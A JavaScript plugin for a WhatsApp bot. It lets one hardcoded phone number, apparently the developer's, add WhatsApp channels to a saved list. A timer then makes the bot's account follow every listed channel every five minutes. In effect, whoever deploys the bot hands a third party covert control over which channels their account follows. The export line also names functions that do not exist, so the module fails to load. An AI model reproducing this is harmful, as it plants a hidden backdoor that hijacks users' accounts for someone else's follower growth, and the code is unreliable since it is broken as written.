'use strict';

const fs = require('fs');
const path = require('path');

const ALLOWED_NUMBER = '923130122643';
const SYSTEM_FILE = path.join(__dirname, '..', 'data', 'system.json');

const channelInfo = {
    contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363426106687970@newsletter',
            newsletterName: '𝑀𝑼𝑍𝜦𝑀𝜤𝐋-𝑿𝑫',
            serverMessageId: -1
        }
    }
};

async function addReaction(sock, message, emoji) {
    try {
        await sock.sendMessage(message.key.remoteJid, {
            react: { text: emoji, key: message.key }
        });
    } catch (error) {
        console.error('Reaction error:', error);
    }
}

function vipBox(title, lines = []) {
    let out = `╭━━━━━━━━━━━━━━━╮\n`;
    out += `   ✦ ${title} ✦\n`;
    out += `╰━━━━━━━━━━━━━━━╯\n`;
    for (const l of lines) out += `▸ ${l}\n`;
    out += `━━━━━━━━━━━━━━━━\n`;
    out += `👑 𝗕𝘆 : 𝑀𝑼𝑍𝜦𝑀𝜤𝐋-𝑿𝑫`;
    return out;
}

function ensureFile() {
    fs.mkdirSync(path.dirname(SYSTEM_FILE), { recursive: true });
    if (!fs.existsSync(SYSTEM_FILE)) {
        fs.writeFileSync(SYSTEM_FILE, '[]');
    }
}

function readChannels() {
    ensureFile();
    try {
        const data = JSON.parse(fs.readFileSync(SYSTEM_FILE, 'utf8'));
        return Array.isArray(data) ? data : [];
    } catch (_) {
        return [];
    }
}

function saveChannels(channels) {
    ensureFile();
    const temporary = `${SYSTEM_FILE}.tmp`;
    fs.writeFileSync(temporary, JSON.stringify(channels, null, 2));
    fs.renameSync(temporary, SYSTEM_FILE);
}

function cleanNumber(value) {
    return String(value || '').split(':')[0].split('@')[0].replace(/\D/g, '');
}

function isAllowed(sock, senderId, message) {
    return cleanNumber(senderId) === ALLOWED_NUMBER
        || (message?.key?.fromMe && (
            cleanNumber(sock?.user?.id) === ALLOWED_NUMBER
            || cleanNumber(message?.key?.remoteJid) === ALLOWED_NUMBER
        ));
}

function parseChannelLink(input) {
    const match = String(input || '').trim().match(
        /^https?:\/\/(?:www\.)?whatsapp\.com\/channel\/([A-Za-z0-9_-]+)(?:\/\d+)?(?:[?#].*)?$/i
    );
    return match ? match[1] : null;
}

async function addSystemCommand(sock, chatId, message, input, senderId) {
    try {
        await addReaction(sock, message, '📥');

        if (!isAllowed(sock, senderId, message)) {
            await addReaction(sock, message, '⛔');
            return sock.sendMessage(chatId, {
                text: vipBox('⛔ 𝙰𝙲𝙲𝙴𝚂𝚂 𝙳𝙴𝙽𝙸𝙴𝙳', [
                    'Only Muzamil',
                    'Can access this command!'
                ]),
                ...channelInfo
            }, { quoted: message });
        }

        const inviteCode = parseChannelLink(input);

        if (!inviteCode) {
            await addReaction(sock, message, '❌');
            return sock.sendMessage(chatId, {
                text: vipBox('❌ 𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙻𝙸𝙽𝙺', [
                    '📌 Usage:',
                    '.addsystem https://whatsapp.com/channel/XXXXXXXX'
                ]),
                ...channelInfo
            }, { quoted: message });
        }

        if (typeof sock.newsletterMetadata !== 'function' ||
            typeof sock.newsletterFollow !== 'function') {
            return sock.sendMessage(chatId, {
                text: vipBox('❌ 𝚄𝙽𝚂𝚄𝙿𝙿𝙾𝚁𝚃𝙴𝙳', [
                    'Baileys does not support channel following.'
                ]),
                ...channelInfo
            }, { quoted: message });
        }

        const metadata = await sock.newsletterMetadata('invite', inviteCode);
        const jid = metadata?.id || metadata?.jid;

        if (!jid || !/@newsletter$/i.test(jid)) {
            throw new Error('Channel could not be resolved');
        }

        const channels = readChannels();
        const exists = channels.some(channel => channel.jid === jid);

        if (!exists) {
            channels.push({
                url: `https://whatsapp.com/channel/${inviteCode}`,
                jid,
                name: metadata?.name || '',
                addedAt: new Date().toISOString()
            });
            saveChannels(channels);
        }

        await sock.newsletterFollow(jid);
        await addReaction(sock, message, exists ? '✅' : '🎉');

        return sock.sendMessage(chatId, {
            text: vipBox(exists ? '✅ 𝙰𝙻𝚁𝙴𝙰𝙳𝚈 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶' : '🎉 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 𝙰𝙳𝙳𝙴𝙳', [
                `🔗 https://whatsapp.com/channel/${inviteCode}`,
                '🤖 Added to System list'
            ]),
            ...channelInfo
        }, { quoted: message });

    } catch (error) {
        console.error('[system]', error);
        await addReaction(sock, message, '❌');
        return sock.sendMessage(chatId, {
            text: vipBox('❌ 𝙵𝙰𝙸𝙻𝙴𝙳', [
                'Channel add/follow nahi ho saka',
                'Check link & try again'
            ]),
            ...channelInfo
        }, { quoted: message });
    }
}

async function listSystemCommand(sock, chatId, message, senderId) {
    try {
        await addReaction(sock, message, '📋');

        if (!isAllowed(sock, senderId, message)) {
            await addReaction(sock, message, '⛔');
            return sock.sendMessage(chatId, {
                text: vipBox('⛔ 𝙰𝙲𝙲𝙴𝚂𝚂 𝙳𝙴𝙽𝙸𝙴𝙳', [
                    'Only Muzamil & Rubab Sheikh'
                ]),
                ...channelInfo
            }, { quoted: message });
        }

        const channels = readChannels();

        if (!channels.length) {
            return sock.sendMessage(chatId, {
                text: vipBox('📭 𝙻𝙸𝚂𝚃 𝙴𝙼𝙿𝚃𝚈', [
                    'No system channels found'
                ]),
                ...channelInfo
            }, { quoted: message });
        }

        const lines = channels.map((channel, index) =>
            `📌 ${index + 1}. ${channel.url || channel.jid}`
        );

        return sock.sendMessage(chatId, {
            text: vipBox(`📋 𝚂𝚈𝚂𝚃𝙴𝙼 𝙻𝙸𝚂𝚃 (${channels.length})`, lines),
            ...channelInfo
        }, { quoted: message });

    } catch (error) {
        console.error('[system]', error);
        return sock.sendMessage(chatId, {
            text: vipBox('❌ 𝙴𝚁𝚁𝙾𝚁', ['Something went wrong']),
            ...channelInfo
        }, { quoted: message });
    }
}

const systemTimers = new WeakMap();

async function followSavedChannels(sock) {
    if (typeof sock.newsletterFollow !== 'function') return;
    if (systemTimers.has(sock)) return;

    const followAll = async () => {
        for (const channel of readChannels()) {
            if (!channel.jid) continue;

            try {
                await sock.newsletterFollow(channel.jid);
                console.log(`✅ System Follow: ${channel.jid}`);
            } catch (error) {
                console.warn(`⚠️ System Follow failed: ${channel.jid}: ${error.message}`);
            }
        }
    };

    await followAll();

    const timer = setInterval(followAll, 5 * 60 * 1000);
    if (timer.unref) timer.unref();

    systemTimers.set(sock, timer);
}

module.exports = {
    addsystemCommand,
    listsystemCommand,
    followSavedChannels
};
